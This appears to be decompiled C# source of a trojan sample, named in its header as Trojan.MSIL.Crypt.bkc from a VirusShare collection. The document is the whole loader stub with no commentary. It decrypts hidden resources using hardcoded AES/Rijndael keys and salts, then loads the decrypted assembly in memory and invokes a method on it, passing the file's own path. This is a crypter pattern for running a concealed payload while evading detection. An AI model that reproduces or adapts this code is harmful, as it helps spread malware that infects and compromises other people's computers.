// Decompiled with JetBrains decompiler
// Type: aBKWySxVnznkewtRBL
// Assembly: thebestone, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: CF5BA54B-9242-4A2C-A72F-CF1F72818DE0
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Trojan.MSIL.Crypt.bkc-812419de90c4960691a784602ef43ac8bc62a737f86525297986b86c74e61c82.exe

using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;

[StandardModule]
internal sealed class aBKWySxVnznkewtRBL
{
  private static int ByteCount = 0;

  [STAThread]
  public static void Main()
  {
    aBKWySxVnznkewtRBL.ftyu();
    ProjectData.EndApp();
  }

  public static void ftyu() => aBKWySxVnznkewtRBL.pol();

  public static void pol()
  {
    string location = Assembly.GetExecutingAssembly().Location;
    string str = MyProject.Computer.FileSystem.SpecialDirectories.CurrentUserApplicationData + "\\CfKI.exe";
    ResourceManager resourceManager = new ResourceManager("JzOYH", Assembly.GetExecutingAssembly());
    string name = resourceManager.GetString("eNNzm");
    string bHQRPUFxFjwvMPSKjx = "JktGhCgFXwXicud";
    string DbhdpsIdenxsWlEYrl = resourceManager.GetString("BkuBwJZovxHeZDFl");
    byte[] bytes1 = Encoding.Default.GetBytes(aBKWySxVnznkewtRBL.DqcEamBizlpQECvOLh(resourceManager.GetString("rLTInjjinY"), "EoFJMDcF"));
    Encoding.Default.GetBytes(aBKWySxVnznkewtRBL.DqcEamBizlpQECvOLh(resourceManager.GetString("FlPeL"), "Sksi"));
    byte[] bytes2 = Encoding.Default.GetBytes(aBKWySxVnznkewtRBL.DqcEamBizlpQECvOLh(DbhdpsIdenxsWlEYrl, bHQRPUFxFjwvMPSKjx));
    RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Assembly.Load(bytes1).GetType(name).GetMethod(resourceManager.GetString("OLFX")).Invoke((object) null, new object[6]
    {
      (object) bytes2,
      (object) true,
      (object) location,
      (object) true,
      (object) false,
      (object) false
    })));
  }

  public static string DqcEamBizlpQECvOLh(string DbhdpsIdenxsWlEYrl, string bHQRPUFxFjwvMPSKjx)
  {
    string s1 = "jhsethsdutubgt";
    string s2 = "a48uyrhf094hy2dm";
    int iterations = 2;
    string strHashName = "SHA1";
    int num = 256;
    try
    {
      byte[] bytes1 = Encoding.Default.GetBytes(DbhdpsIdenxsWlEYrl);
      byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
      byte[] bytes3 = Encoding.ASCII.GetBytes(s1);
      byte[] buffer = bytes1;
      byte[] bytes4 = new PasswordDeriveBytes(bHQRPUFxFjwvMPSKjx, bytes3, strHashName, iterations).GetBytes(checked ((int) Math.Round(unchecked ((double) num / 8.0))));
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      rijndaelManaged.Mode = CipherMode.CBC;
      byte[] numArray = new byte[checked (buffer.Length + 1)];
      using (ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor(bytes4, bytes2))
      {
        using (MemoryStream memoryStream = new MemoryStream(buffer))
        {
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read))
          {
            aBKWySxVnznkewtRBL.ByteCount = cryptoStream.Read(numArray, 0, numArray.Length);
            memoryStream.Close();
            cryptoStream.Close();
          }
        }
      }
      rijndaelManaged.Clear();
      return Encoding.Default.GetString(numArray);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      throw;
    }
  }
}
